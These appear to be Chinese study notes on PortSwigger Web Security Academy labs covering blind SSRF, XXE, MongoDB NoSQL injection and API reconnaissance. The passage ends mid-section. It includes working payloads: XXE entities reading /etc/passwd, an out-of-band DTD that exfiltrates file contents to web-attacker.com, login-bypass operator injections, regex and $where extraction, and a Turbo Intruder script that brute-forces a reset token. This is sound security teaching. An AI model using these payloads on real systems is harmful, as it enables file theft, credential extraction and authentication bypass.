盲 SSRF 通常的影响低于有响应的 SSRF，因为不能被利用检索数据，但有些情况下会被利用实现 RCE。  

### 发现

发现和检查盲 SSRF 比较有效的方法是使用 OAST ，尝试对外发起连接请求。  

在测试时有时会发现有对应 DNS 查询记录但没有后续请求，通常时因为应用程序尝试发起 HTTP 请求，主机发送了 DNS 查询，但后续 HTTP 被网络层过滤阻止了。很多时候基础设施层面允许 DNS 请求，但阻止 HTTP 请求。       

### 利用

能够触发一个带外 HTTP 请求的盲 SSRF 通常没有太多可利用的路径，但有时可以被利用进行内网探测，批量发送已知漏洞的 Payload，如果这些 Payload 可以被利用也发起 OAST 带外请求，就会被进一步利用来确认内网中存在漏洞的服务器。  

常见目标：

| 目标                | 探测方式                   | 可能发现的漏洞            |
| :------------------ | :------------------------- | :------------------------ |
| **内部 Web 服务器** | 发送 HTTP 请求到常见端口   | 未授权访问、默认凭证      |
| **Redis**           | 发送 `gopher://` Payload   | 未授权访问、写入 SSH 密钥 |
| **Elasticsearch**   | 发送 HTTP 请求到 9200 端口 | 未授权访问、数据泄露      |
| **Jenkins**         | 发送 HTTP 请求到 8080 端口 | 未授权访问、RCE           |
| **云元数据**        | 请求 `169.254.169.254`     | 获取云服务器凭证          |



## 寻找隐藏攻击面

很多 SSRF 漏洞比较容易找到，因为应用程序正常请求的完整 URL、参数会被记录。有一些场景下会隐藏的比较深，较难定位。

### Partial URLs in request 请求中的部分URL

有些应用将主机名或者 URL 路径的一部分放入请求参数，提交到后端服务。  



### URLs with data format 数据格式 中的 URL

一些应用使用规定的格式传输数据。请求的 URL 包含在这些格式的数据文件中。常见的有 XML、JSON 等，此时就容易收到注入攻击，例如  XXE。 



### SSRF via Referer header

一些应用出与跟踪、分析数据等原因会记录用户请求头中的 Referer 信息，如果分析软件会访问出现在该字段值的 URL，进一步记录站点内容等，就会被利用来 SSRF。  



## Payload cheat sheet

https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet





# XML external entity(XXE) injection XML外部实体注入



XXE 是一种攻击者可以干预到应用程序处理 XML 数据的漏洞。通常会导致攻击者查看应用服务器的文件系统、与应用服务器后端服务进行交互。一些场景下会扩大影响到后端底层服务器及其它基础设施，促使服务器发起 SSRF 攻击。  

这种漏洞产生的原因是由于应用程序几乎总是通过标准库或者平台 API 处理服务器上的 XML 数据，XML 相关标准中包含了多种潜在危险的特性，虽然这些特性很多应用用不到，但标准 XML 解析器会实现这些特性。  

XML 外部实体是一种自定义的 XML实体，其定义的值是从声明它们的 DTD 之外加载的，允许基于文件路径或者 URL 的内容定义一个实体。  



## XML entities

XML 全称是 "extensible markup language"，设计来存储或传输数据。如同 HTML，XML 使用标签和数据的树状结构，但不像HTML那样包含预定义标签，因此 tag 可以包含名称用来描述数据。早期 web 历史中很流行，但如今更多的应用使用 JSON 格式。  



### 内置实体

XML 实体是一种在 XML 文档中表示数据项的方式，不是数据本身。XML 规范中定义了一些内建的实体，例如 实体 `&lt` 和 `&gt` 分别表示字符 `<` 和 `>`，这些是用于表示 XML 标签的元字符，当他们出现在数据中时，通常必须使用它们的实体来表示。  

常见实体：

| 实体     | 表示的字符 | 用途                     |
| :------- | :--------- | :----------------------- |
| `&lt;`   | `<`        | 小于号（标签开始）       |
| `&gt;`   | `>`        | 大于号（标签结束）       |
| `&amp;`  | `&`        | 与符号（实体引用的开始） |
| `&quot;` | `"`        | 双引号（属性值边界）     |
| `&apos`  | `'`        | 单引号（属性值边界）     |

需要实体的原因：`<`、`>`、`&`、`"`、`'` 在 XML 中有特殊含义。当它们作为**数据**出现时，必须用实体表示，否则解析器会误以为它们是 XML 语法的一部分。

```
XML 文档：
<user>Tom & Jerry</user>
         ↑
    解析器看到 & 会认为这是实体的开始，但 & Jerry 不是合法实体
    → 解析错误

正确写法：
<user>Tom &amp; Jerry</user>
         ↑
    解析器看到 &amp; 会将其替换为 &
    → 正确解析
```



XML 文档类型定义(Document Type Definition,DTD)包含了一个 XML 中可以定义的结构、包含的数据值类型、其它项目的声明。 DTD 在文档开头的可选 `DOCTYPE` 元素内部中声明。DTD 可以包含在文档本身之内，被称为内部 DTD，也可以从外部加载，被称为外部 DTD，也可以是两者的混合体。  





### 自定义实体

XML 允许自定义实体，例如

```xml
<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>
```

上面定义的含义是：任何在此 xml 中引用 `&myentity;` 的地方会被替换为 `my entity value` 。



### 外部实体

XML 外部实体是指定义在 xml 外部的自定义实体类型。使用 `SYSTEM` 关键字并指定一个 URL 来声明外部自定义实体。     

示例：

```xml
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>
```

也可以使用 `file://` 形式从文件中加载外部自定义实体：

```xml
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>
```







## XXE 攻击类型

* 利用 XXE 获取文件，当一个外部实体的定义中包含文件内容，并从应用响应返回。
* 利用 XXE 执行 SSRF 攻击，当一个外部实体的定义基于 URL。
* 盲 XXE 通过带外网络携带数据，将敏感数据传输到攻击者的系统上。
* 盲 XXE 经过错误消息获取数据，攻击者可以触发一个解析错误消息，消息包含了敏感数据。



## 利用 XXE 获取文件

可以通过两种方式：

* 引入或者编辑 `DOCTYPE` 元素，其中定义的外部实体包含了文件路径。
* 编辑 XML 中定义的外部实体的值，返回给应用程序。



示例，假设一个商城应用检查库存是通过提交如下 xml 内容给服务端：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```

拦截并修改内容，加入新的 `DOCTYPE` 引用要获取的文件，并在后面进行引用，这里使用 `&xxe`：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

如果应用程序没有做任何防护，就会将文件内容包含在上下文中返回：

```
Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```





## 利用 XXE 执行 SSRF 攻击

如果应用程序中引用了 URL 的方式，就可以被利用来发起 SSRF。  

示例：

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```





## 盲 XXE

很多应用程序不会在 response 中包含定义的外部实体的值，这种场景下直接获取文件将行不通，但盲 XXE 还是能够被利用，有时需要结合一些带外技术或者导致触发解析错误的手段。

  

### 使用 OAST 探测盲 XXE

定义一个外部实体：

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```

这个 XXE 攻击会导致服务器发起一个 HTTP 请求到攻击者可以掌控的地址，通过监控 DNS 解析记录和 HTTP 请求记录，能够探测盲 XXE 是否成功。  



有时 XXE 攻击使用的普通实体被输入验证或者 XML 解析器拦截，可以使用 XML 参数实体替代，`XML 参数实体` 是一种特殊类型的 XML 实体，只能被别处的 DTD 引用。  

首先在参数实体名前使用 `%` 字符声明一个参数实体：

```xml
<!ENTITY % myparameterentity "my parameter entity value" >
```

然后使用 `%` 字符引用：

```xml
%myparameterentity;
```

参数实体类型定义测试使用 OAST 来探测盲 XXE：

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```





### 利用盲 XXE 经 OAST 携带数据

 上一节是检测盲 XXE 漏洞，攻击者真正想要利用该盲 XXE 漏洞外泄敏感数据，还需要一些步骤，要在攻击者控制的系统上放置一个恶意 DTD，然后从带内 XXE Payload 中调用该外部 DTD。  

示例 DTD：

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

上面 DTD 执行如下动作：

* 定义一个参数实体 file，包含文件 /etc/passwd
* 定义一个参数实体 eval，包含一个动态声明的参数实体 exfiltrate，exfiltrate 引用一个 URL，URL中包含了上一步定义的 file 内容
* 使用 eval 实体，触发动态参数实体 exfiltrate 被执行
* 使用 exfiltrate 实体，触发请求指定的 URL

然后攻击者会放置恶意的 DTD 到他们控制的 web 主机上，例如：

```xml
http://web-attacker.com/malicious.dtd
```

最后攻击者提交 XXE Payload 到应用程序：

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
```

这个 Payload 声明一个名为 xxe 的参数实体，然后在 DTD 中使用。这会导致 XML 解析并从攻击者提供的服务器获取外部 DTD 并内联解释，恶意 DTD 中定义的步骤随后被执行，文件内容被传输到攻击者服务器。  

不过需要注意的是，在很多有换行的文件中可能无法利用，此时可以尝试 FTP 等协议替代 HTTP 或者更换尝试读取单行的文件。  



DTD 中一些替代的字符编码

| 原始字符 | 编码后   | 原因                                   |
| :------- | :------- | :------------------------------------- |
| `%`      | `&#x25;` | 在实体值中不能直接使用 `%`             |
| `&`      | `&#x26;` | 在实体值中不能直接使用 `&`             |
| `'`      | `&#x27;` | 在单引号包裹的实体值中不能直接使用 `'` |

**为什么需要这些编码？**

- 在 DTD 中，实体值本身是被引号包裹的字符串。
- 如果字符串中需要包含 `%`、`&`、`'` 等特殊字符，必须使用 HTML 实体编码，否则会被解析器提前解释。









### 盲 XXE 经错误消息获取数据

有些时候应用程序没有在 response 中返回文件数据，但 XML 解析错误消息中可能会包含文件数据，如果 response 中包含错误消息就可以被利用来获取数据。  

示例，一个恶意 DTD：

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

行为如下：

* 定义一个参数实体 file，包含 /etc/passwd 文件
* 定义一个参数实体 eval，包含一个动态声明的外部参数实体 error，引用了不存在的路径和 file 实体的内容
* 使用 eval，触发动态声明的 error 实体被触发
* 使用 error 实体，触发文件不存在的错误解析消息中将包含 file 引用的 /etc/passwd 文件内容

调用上面的恶意外部 DTD，可能会获取如下类似消息：

```
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```





### 利用本地 DTD 

很多时候无法调用外部 DTD，但如果知道目标服务器上存在一些已知的 DTD，这些 DTD 就可以被利用。  

假设服务器有一个 DTD ：`/usr/local/app/schema.dtd` ，定义了一个实体 `custom_entity` ，攻击者就可以通过如下包含 /etc/passwd 文件的 Payload 触发错误消息：

```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

* 定义了一个参数实体 local_dtd，引用本地已存在的 DTD `/usr/local/app/schema.dtd` 
* 重新定义了该 DTD 中已存在的 custom_entity 实体，触发了包含 /etc/passwd 内容上下文的错误消息
* 使用 local_dtd 实体，外部 DTD 被解释，包含了重定义的 custom_entity 的值，这就导致产生错误消息



**定位一个可利用的本地 DTD 文件**   

这种 XXE 攻击的一个关键点就是利用文件系统上现有的 DTD，需要有一些方法探测和定位这些 DTD 文件。  

例如使用 GNOME 桌面环境的通常存在： `/usr/share/yelp/dtd/docbookx.dtd` 这样一个 DTD 文件。  

使用如下 XXE Payload 可以探测该文件是否存在：

```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```

如果文件缺失将导致一个错误，当定位一个确定存在的 DTD 以后，可以尝试从网上其它途径获取此路径文件下 DTD 定义的内容，很多 DTD 都是开源软件中定义和使用的。  



## 找到隐藏攻击面

如果应用程序正常在 HTTP 流量中包含 XML 数据，这种场景如果存在 XXE 将会比较明显。但有些场景不是像这样明显的交互。  

### XInclude 攻击

有些场景下应用程序接收到客户端数据之后，在服务端才嵌入到一个 XML 文档中，然后进行解析。例如客户端提交的数据存放到一个后端 SOAP 请求中，由后端 SOAP 服务处理。  

这种场景下前面的 XXE 攻击将不可用，因为无法控制整个 XML，也就无法定义或修改 `DOCTYPE` 元素。但可以使用 `XInclude` 元素代替，`XInclude` 元素是 XML 规范的一部分，允许从子文档构建 XML 文档，这样就可以将 XInclude 文档攻击放置在任何 XML 文档的任何数据中，因此可以在你提交的单个数据项情况下提交。  

示例，需要先引入 XInclude 命名空间，并提供希望包含的文件路径：

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```



### 通过文件上传进行 XXE

一些应用程序允许用户上传文件，然后在服务端处理。有一些常见的文件格式使用或包含了 XML 文档格式，例如 DOCX、SVG。  

这样就可以利用来上传包含恶意 DTD 的文件，从而找到 XXE 攻击面。   



### 修改上下文类型

大多数 POST 请求使用 HTML 表单生成的默认类型，例如 `application/x-www-form-urlencoded` ，有些网站会允许其它内容类型，例如 XML。  

示例，一个 http 请求如下：

```http
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```

修改成如下类型：

```http
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```

如果应用程序允许并解析消息体中的 xml 内容，就可以尝试找到 XXE 攻击面。  



### 快速发现和测试 XXE 漏洞

大多数 XXE 可以使用 web 漏洞扫描器发现。  

手工测试 XXE 漏洞，通常涉及：

* 基于一个已知操作系统文件定义外部实体，并在应用程序中使用该实体，测试和检索文件
* 通过监控你控制的 URL 外部实体相关 DNS、HTTP 请求，盲测 XXE 漏洞
* 使用 XInclude 攻击尝试检索已知操作系统文件，测试用户提供的非 XML 格式数据在服务端 XML 文档处理存在的漏洞



需要注意的是有时要使用 XML 转义编码 Payload，避免破坏 XML 语法。XML 只是一种数据传输格式，除了 XXE 还可以尝试 XSS 、SQL 注入等漏洞。  



## 预防

禁用那些用不到的 XML 危险特性，通常禁用外部实体解析和对 XInclude 的支持就足够，参考每种实现库和API的文档。











# NoSQL injection

NoSQL 注入是指攻击者能够干预应用程序和 NoSQL 数据库之间的交互。可能让攻击者：

* 绕过验证或者保护机制
* 获取或者编辑数据
* DOS 攻击
* 执行代码

NoSQL 数据库通常采用与传统关系型数据库不同形式的结构存储和检索数据，采用通用宽泛的查询语法取代普遍标准的 SQL 语法，关系约束也比较少。     

有两种类型的 NoSQL 注入：

* 语法注入。通过打破 NoSQL 的查询语法，注入 Payload，类似 SQL 注入。
* 操作注入。发生在可以操纵 NoSQL 查询操作时。



这个主题里主要以 MongoDB 为例。  



## 语法注入

可以通过尝试中断查询语句来探测潜在的 NoSQL 注入，系统的测试每个输入，通过提交模糊字符串和特殊字符来触发数据库错误或者其它行为，找到没有被应用净化或者过滤的入口。  

如果知道目标数据库的 API 语言，就使用相关的语法字符串和特殊字符做模糊测试，否则可以使用多种模糊字符串做测试。  

### 探测 MongoDB 语法注入

MongoDB 示例：一个购物应用显示产品分类，当用户选择某个分类，浏览器发起类似如下请求：

```http
https://insecure-website.com/product/lookup?category=fizzy
```

这会导致应用发送一个 JSON 查询去 MongoDB 数据库中检索与 product 关联的 collection ：

```
this.category == 'fizzy'
```

这里就可以提交一个模糊字符串进行测试：

```
'"`{
;$Foo}
$Foo \xYZ
```

构造如下的攻击：

```http
https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```

观察服务器的 response，这可能会导致过滤和净化不正确。  



### 探测中断字符

要探测哪个字符会中断应用的语法，可以提交注入单个 `'` ，Mongodb 中会生成如下语法:

```
this.category == '''
```

如果这导致原始 response 发生改变，就表明 `'` 字符破坏了查询语法，再提交如下转义字符串做确认：

```
this.category == '\''
```

如果转义字符串不会导致语法错误，就意味着应用存在注入攻击漏洞。  





### 确认条件行为

在探测存在漏洞后，下一步就是查找使用布尔条件的位置。  

发送两个请求，一个带有 false 条件另一个带有 true 的条件。例如可以使用条件语句 `' && 0 && 'x` 和 `' && 1 && 'x` ：

```
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'x
```

```
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x
```

如果应用出表现不同的行为，就表明 false 提交影响了查询逻辑，但是 true 条件没有。表明这种注入方式语法会影响到服务端查询。  



### 覆盖已存在条件

现在已经识别出可以影响的布尔条件，可以试图覆盖已存在的条件来利用漏洞。例如可以注入 JS 条件使得永远为 true： `'||'1'=='1`

```
https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%27%31%27%3d%3d%27%31
```

这会产生 MongoDB 查询:

```
this.category == 'fizzy'||'1'=='1'
```

由于注入了条件总是真，会返回所有商品，包括未知分类的。  



还可以追加一个 null 字符在 category 值之后，MongoDB 可能会忽略 null 字符后面所有字符。

例如，下面查询包含一个附加 `this.released` 约束 ：

```
this.category == 'fizzy' && this.released == 1
```

这个约束 `this.released == 1` 用来过滤仅显示那些 released 的商品。未发布的商品可能标记为 `this.released == 0`。攻击者就可以构造如下攻击：

```
https://insecure-website.com/product/lookup?category=fizzy'%00
```

这会导致如下查询：

```
this.category == 'fizzy'\u0000' && this.released == 1
```

如果 MongoDB 忽略 null 之后所有字符，就移除了 release 字段， `fizzy` 分类中的所有产品都会展示出来，包括未发布的。  





## 运算符注入

NoSQL 数据库通常使用一些特殊的查询运算符，例如 MongoDB 包含：

- `$where` - 匹配满足 JS 表达式 的文档
- `$ne` - 匹配不等于特殊值的
- `$in` - 匹配其中所有值，尤其是数组中
- `$regex` - 匹配特殊正则表达式的值

也许能够通过运算符注入操纵 NoSQL 数据库，系统地提交不同运算符到相关用户输入位置，然后检查相关响应和错误消息的改变。



### 提交查询运算符

JSON 消息中，可以插入运算符到内嵌对象中，例如 `{"username":"wiener"}` 变为 `{"username":{"$ne":"invalid"}}`。  

基于 URL 编码的输入，你可以基于 URL 参数插入运算符，例如 `username=wiener` 变为 `username[$ne]=invalid`，如果这种方式不工作，还可以尝试如下方法:

1. 转换 `GET` 请求方法为 `POST`。
2. 改变 `Content-Type` header 为 `application/json`。
3. 添加 JSON 到请求 body。
4. 注入查询运算符到 JSON 中。



可以使用 [Content Type Converter](https://portswigger.net/bappstore/db57ecbe2cb7446292a94aa6181c9278) 扩展插件来自动转换 URL编码请求为 JSON。



### 探测 MongoDB 中的操作注入

假设一个存在漏洞的应用通过 POST 请求的 body 接收用户名和密码:

```
{"username":"wiener","password":"peter"}
```

使用一系列运算符对输入进行测试。例如，可以通过用户名输入注入如下操作符：

```
{"username":{"$ne":"invalid"},"password":"peter"}
```

如果 `$ne` 运算符提交，查询的所有用户名就不等于 `invalid` 这个值。   

如果同时注入用户名和密码，可能需要通过如下 payload 方式注入通过验证：

```
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
```

这个查询返回所有不等于 `invalid` 登录凭证。应该能够使得你以集合中第一个用户身份登录应用。  

针对目标账户，你可以构造一个 payload 包含已知用户名，或者猜想的用户名，例如：

```
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
```





## 利用语法注入提取数据

很多 NoSQL 数据库中的操作运算符或者函数中可以运行受限制的 JS 代码，例如 MongoDB 的 `$where` 操作符和 `mapReduce()` 函数。 这就意味着，如果应用程序使用了这些运算符或者函数，数据库可能会将 JS 作为查询的一部分运行。因此能够使用 JS 从数据库提取数据。  



### 在 MongoDB 中提取数据

设想一个应用允许用户查找其它注册的用户名并显示其角色，通过下面的请求来触发：

```
https://insecure-website.com/user/lookup?username=admin
```

这会产生如下查询：

```
{"$where":"this.username == 'admin'"}
```

这里使用了 `$where` 运算符，就可以试图注入 JS 函数到查询语句中检索敏感数据。例如可以发送如下 Payload：

```
admin' && this.password[0] == 'a' || 'a'=='b
```

这个方法返回密码中的第一个字符，让你能够提取密码。  

还可以使用 JS 中的 `match()` 函数获取数据。例如，下面的  payload 让你能够识别密码是否包含数字：

```
admin' && this.password.match(/\d/) || 'a'=='b
```



**识别元素名**

由于 MongoDB 处理半结构化数据，而不需要固定的模式（schema），因此在使用 JS 注入获取数据之前，需要识别出 collection 中的有效元素（filed） ，例如，想识别出 MongoDB 中包含 `password` 的元素，可以提交如下 Payload：

```
https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d'
```

分别发送 payload 给一个已存在的元素和一个不存在的元素，在这个示例中已知 `username` 元素存在，因此发送如下 payload：

```
admin' && this.username!='
```

```
admin' && this.foo!='
```

如果 `password` 元素存在，预期的响应和已存在的元素 (`username`) 响应相同，但与不能存在的元素 (`foo`) 的响应不同。 

如果想要测试不同的元素名，可以执行字典攻击，使用词表循环遍历不同的潜在元素。



portswigger Lab 使用 Intruder ，配置P1、P2两个位置的 payload 分别为 0-8 和 小写字母：

```http
GET /user/lookup?user=administrator%27%20%26%26%20this.password[P1]=="P2"%20%26%26%20this.password!=%27
```







注：也可以使用 NoSQL 运算符来逐字符提取字段名，这样无需猜测或者执行字典攻击。



```
关系型数据库（MySQL）：
表结构固定 → 字段名已知（username, password, email...）
  ↓
注入时直接猜字段名即可

MongoDB（NoSQL）：
半结构化 → 每个文档的字段可以不同
  ↓
集合里可能有 password、apiKey、secret、role...
  ↓
不知道字段名 → 无法构造有效的 JavaScript 注入
```

```
基准 1（已知存在）：
admin' && this.username!='
  ↓
username 存在且不为空 → true → 响应 A

基准 2（已知不存在）：
admin' && this.foo!='
  ↓
foo 不存在 → 响应 B

测试目标：
admin' && this.password!='
  ↓
如果响应 == A → password 存在
如果响应 == B → password 不存在
```

```
词表：
password, passwd, pwd, secret, apiKey, api_key, token, role, isAdmin, ...

对每个词发送：
admin' && this.<word>!='
  ↓
如果响应 == “存在”模板 → 命中字段名
如果响应 == “不存在”模板 → 继续下一个
```







## 利用运算符注入提取数据

即使原始查询语句不使用任何可以注入 JS 的运算符，你也可以尝试注入一些运算符，使用布尔条件来判断应用是否执行了你注入的 JS。   

### 向 MongoDB 注入运算符

假设一个应用通过 POST 请求接收用户名和密码参数：

```
{"username":"wiener","password":"peter"}
```

可以尝试增加一个 `$where` 运算符为附加参数，然后分别发送一个条件为 false 和一个条件为 true 的请求：

```
{"username":"wiener","password":"peter", "$where":"0"}
```

```
{"username":"wiener","password":"peter", "$where":"1"}
```

如果返回不同的响应，就意味着 `$where` 从句可以被利用。  



#### Extracting field names

如果能够注入运算符来运行 JS，就可以使用 `keys()` 方法来提取数据元素名。例如提交如下 payload：

```
"$where":"Object.keys(this)[0].match('^.{0}a.*')"
```

这检查用户对象中第一个数据元素，返回元素名称中第一个字符。这样就可以逐个提取元素名称字符。



#### Exfiltrating data using operators

或者可以尝试 `$regex` 运算符逐个提取字符。  

假设如下应用通过 POST 请求的 body 接收用户名和密码：

```
{"username":"myuser","password":"mypass"}
```

就可以通过 `$regex` 运算符进行测试：

```
{"username":"admin","password":{"$regex":"^.*"}}
```

如果 response 返回的内容区别于你提交的错误密码字符，着就表明应用存在漏洞，可以通过  `$regex` 运算符来逐个提取密码字符。例如，下面请求检查密码从字符 `a` 开始：

```
{"username":"admin","password":{"$regex":"^a.*"}}
```



实验 lab 所用 Turbo Intruder 插件脚本：

```python
import string

def queueRequests(target, wordlists):
    # 并发数可调节
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=15,
                           engine=Engine.BURP2
                           )

    host = "0ad000f7032906fa80cccb8200470058.web-security-academy.net"

    # 偏移量 0-20
    offsets = [str(i) for i in range(0, 21)]
    
    # 大小写字母、数字、下划线
    chars = list(string.ascii_letters + string.digits + "_")

    for offset in offsets:
        for char in chars:
            # 使用 Python 的字符串拼接直接构造 JSON body
            # 注意这里使用单引号包裹外部，内部的双引号和单引号需要正确处理
            json_body = '{"username":"carlos","password":{"$ne": "invalid"},\r\n' + \
                        ## 先循环匹配出重置token的字段名 ，然后在用字段名匹配出对应 token 值
                        ## '"$where":"Object.keys(this)[4].match(\'^.{' + offset + '}' + char + '.*\')"}'
                        '"$where":"this.pwResetTkn.match(\'^.{' + offset + '}' + char + '.*\')"}'
            
            # 完整的 HTTP 请求（去掉 Content-Length 让引擎自动算）
            req = "POST /login HTTP/2\r\n" + \
                  "Host: " + host + "\r\n" + \
                  "Cookie: session=zyd6Y8besPphemuBmSbIiauz5zcPCsad\r\n" + \
                  "Content-Type: application/json\r\n\r\n" + \
                  json_body
            
            # 只传完整请求，不传占位符参数，避开底层的参数解析错误
            engine.queue(req)


def handleResponse(req, interesting):
    # 根据实际情况调整：如果成功登录，通常不包含 "Invalid username" 或返回 200
    # 这里假设如果返回 302（重定向，登录成功）或者响应中没有错误信息，则算命中
    if req.status == 302 or (req.status == 200 and b'Invalid username' not in req.response):
        table.add(req)
```







## 基于时间的注入

有时触发一个数据库错误不会导致应用返回不同的响应。这种场景需要通过触发延迟来探测和利用此类型的漏洞：

1. 多次加载页面来确定一个基线时间
2. 插入一个定时 payload 到输入中。例如 `{"$where": "sleep(5000)"}` 会导致一个成功的注入在内部延迟 5 秒钟。
3. 确认响应加载是否变慢，就能确定是否存在注入点

如果密码第一个字符是 `a` ，下面基于定时的 payload 会触发延迟：

```
admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
```

```
admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
```







## 预防

预防 NoSQL 注入攻击取决于这种 NoSQL 所用的技术，多阅读官方的安全文档，还可以参考一些宽泛的指导方法：

- 使用白名单净化和验证用户输入
- 使用参数化用户输入替代拼接式的查询
- 通过运算符白名单来预防运算符注入







# API Testing

API(Application Programming Interfaces)使得软件系统和应用程序之间交流并共享数据，所有动态网站都由 API 构成，像 SQL注入这种经典的web漏洞也可以归类为 API 测试，这里主要关注 RESTful、JSON API 上。  

OWASP TOP Ten 2023 与各个主题的关联（包含API 相关）https://portswigger.net/web-security/api-testing/top-10-api-vulnerabilities



## API recon侦察

在开始测试 API 之前，尽可能多的找到 API，从而发现攻击面。  

首先要识别出 API 端点，这是服务器接收 request 请求的位置。例如下列 GET 请求：

```http
GET /api/books HTTP/1.1
Host: example.com
```

这个请求的 API 端点是 `/api/books` ，响应的结果是从图书馆系统中列出相关书籍。另一个端点，比如 `/api/books/mystery` 可能是检索隐藏书籍。  

一旦找到端点就要研究如何与之交互，发送对应请求去测试 API ，比如需要找到如下相关信息：

* API 处理的输入数据，包括必要、非必要的参数
* API 接收的请求方法和数据类型
* 速率和请求机制



## API 文档

API 通常会有文档用于给开发人员了解如何使用和集成。文档有人类可读和机器可读的，人类可读的主要设计来帮助程序员理解如何使用这些 API，包含详细的阐述、示例、概念等，机器可读的文档是设计来给软件相关的自动化任务，例如 API 集成、验证、测试等，常见的格式有 JSON、XML。  

API 文档通常是公共可读的，尤其是对外提供服务的 API。这种场景下首先就是检查 API 文档。  



### 发现 API 文档

即使 API 文档不是公共可读，仍然可以通过观察应用如何与 API 交互来了解。或者通过 Burp Scanner 、Intruder 之类工具进行扫描。  

如果找到一个资源端点，就调查相关的基础路径，例如 `/api/swagger/v1/users/123` 这样一个接口，就可以尝试查看如下接口：

* `/api/swagger/v1`
* `/api/swagger`
* `/api`





### 使用机器可读 API 文档

可以使用一些自动化工具分析找到的机器可读的 API 文档，例如 Burp Scanner，有一些 XML、JSON 的解析器或者格式美化软件，OpenAPI Parser BApp 可以转换 API 文档为 Burp 可用的请求集合以方便测试，还有一些专用的测试API文档工具，例如 `Postman`、`SoapUI`。  





## 识别 API 端点

除了浏览器直接请求的端点，还要注意一些 JS 之类的文件中包含的非浏览器直接触发的 API 端点。  

与 API 端点交互，研究如何交互，例如：

**识别支持的 HTTP 方法**  

- `GET`——从资源检索数据。
- `PATCH`——对资源应用部分更改。
- `OPTIONS`——检索有关可用于资源的请求方法类型的信息。

一个 API 端点可能支持不同的方法，例如，端点 `/api/tasks` 可能支持以下方法：

- `GET /api/tasks`——检索任务列表。
- `POST /api/tasks`——创建新任务。
- `DELETE /api/tasks/1`——删除任务。



**识别支持的内容类型**  

API 端点通常支持特定格式数据，根据数据内容类型不同而表现出不同行为，修改内容测试可以发现：

* 触发泄露有用的错误信息
* 绕过有缺陷的防御
* 利用处理逻辑的差异，比如有些端点在处理 JSON 、XML 时会有差异

修改 `Content-Type` 头，重新格式化请求的 body 尝试，可以使用 [Content type converter](https://portswigger.net/bappstore/db57ecbe2cb7446292a94aa6181c9278) 插件转换数据提交请求。



**寻找隐藏端点** 

如果找到一些初始 API 端点，使用 Intrunder 工具通过注入不同 payload 尝试找到更多隐藏端点，例如有如下 API ：

```http
PUT /api/user/update
```

可以在 Intrunder 中注入 `delete`、`add` 之类的 Payload，基于 API 命名约定或者行业常见的词表来找到更多隐藏端点。   





## 隐藏参数

在侦察 API 时，可能会发现 API 支持但文档中未记录的参数。可以尝试使用这些参数改变程序行为。Burp 有很多帮助识别隐藏参数的工具：

- **Burp Intruder** 能够自动发现隐藏参数，使用常见参数名称的词表来替换现有参数或添加新参数。
- **Param Miner** 插件能够自动为每个请求猜测最多 65,536 个参数名。Param Miner 根据从 scope 中获取的信息，自动猜测与应用程序相关的名称。
- **Content discovery** 工具可以从你不可浏览的可见内容中发现链接的内容，包括参数。



**批量赋值漏洞**  

批量赋值（又称自动绑定）可能无意间创建隐藏参数。当一些软件框架自动将请求参数绑定到内部对象的字段时，就会发生此种情况。  



**识别隐藏参数**  

